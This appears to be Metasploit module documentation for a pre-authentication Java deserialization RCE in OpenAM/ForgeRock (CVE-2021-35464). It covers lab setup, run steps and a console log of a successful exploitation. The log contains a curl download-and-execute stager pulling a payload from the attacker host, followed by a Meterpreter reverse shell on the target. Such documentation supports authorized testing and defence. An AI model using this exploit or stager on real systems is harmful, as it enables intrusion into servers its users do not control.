## Vulnerable Application

### Description

This module leverages a pre-authentication remote code execution vulnerability in the OpenAM identity and access
management solution. The vulnerability arises from a Java deserialization flaw in OpenAMâ€™s implementation of the Jato
framework and can be triggered by a simple one-line GET or POST request to a vulnerable endpoint. Successful
exploitation yields code execution on the target system.

This vulnerability also affects the ForgeRock identity platform which is built on top of OpenAM and is thus
is susceptible to the same issue.
### Installation


#### OpenAM on Ubuntu 20.04.2 x64 with Docker version 20.10.2

1. `sudo docker run -h localhost -p 7080:8080 --name openam openidentityplatform/openam`
1. Navigate to http://<ip_address>:7080/openam
1. Follow manual configuration steps. Automatic configuration appears to fail.
1. Except where otherwise noted, use the default configuration values and set password fields where required.
    1. In Step 3, set the ports to the following values
        * DIRECTORY_ADMIN_PORT = 4444
        * DIRECTORY_JMX_PORT = 1689
        * DIRECTORY_PORT = 389
    1. In Step 4, select "OpenAM User Data Store"

## Verification Steps

1. OpenAM
1. Perform manual configuration of OpenAM
1. Do: `use exploit/multi/http/multi/http/cve_2021_35464_forgerock_openam`
1. Do: `set RHOST <ip>`
1. Do: `set LHOST <ip>`
1. Do: `set LPORT <port>`
1. Do: `run`
1. You should get a Meterpreter session.

## Scenarios

#### OpenAM on Ubuntu 20.04.2 x64 with Docker version 20.10.2
```
msf6 exploit(multi/http/cve_2021_35464_forgerock_openam) > show options

Module options (exploit/multi/http/cve_2021_35464_forgerock_openam):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.134.134  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      7080             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local mac
                                         hine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.135.197  yes       The listen address (an interface may be specified)
   LPORT  8443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper


msf6 exploit(multi/http/cve_2021_35464_forgerock_openam) > run

[*] Started reverse TCP handler on 192.168.135.197:8443 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/Zrrhm8JKIL8QB2Q
[*] Local IP: http://192.168.135.197:8080/Zrrhm8JKIL8QB2Q
[*] Generated command stager: ["curl -so /tmp/wMKsYYMP http://192.168.135.197:8080/Zrrhm8JKIL8QB2Q;chmod +x /tmp/wMKsYYMP;/tmp/wMKsYYMP;rm -f /tmp/wMKsYYMP"]
[+] Successfully executed command: curl -so /tmp/wMKsYYMP http://192.168.135.197:8080/Zrrhm8JKIL8QB2Q;chmod +x /tmp/wMKsYYMP;/tmp/wMKsYYMP;rm -f /tmp/wMKsYYMP
[*] Client 192.168.134.134 (curl/7.64.0) requested /Zrrhm8JKIL8QB2Q
[*] Sending payload to 192.168.134.134 (curl/7.64.0)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3012548 bytes) to 192.168.134.134
[*] Command Stager progress - 100.00% done (123/123 bytes)
[*] Meterpreter session 11 opened (192.168.135.197:8443 -> 192.168.134.134:44944) at 2021-07-02 15:59:30 -0500
[*] Server stopped.

meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Debian 10.9 (Linux 5.8.0-53-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: openam @ localhost (uid=1001, gid=0, euid=1001, egid=0)
meterpreter > 

```
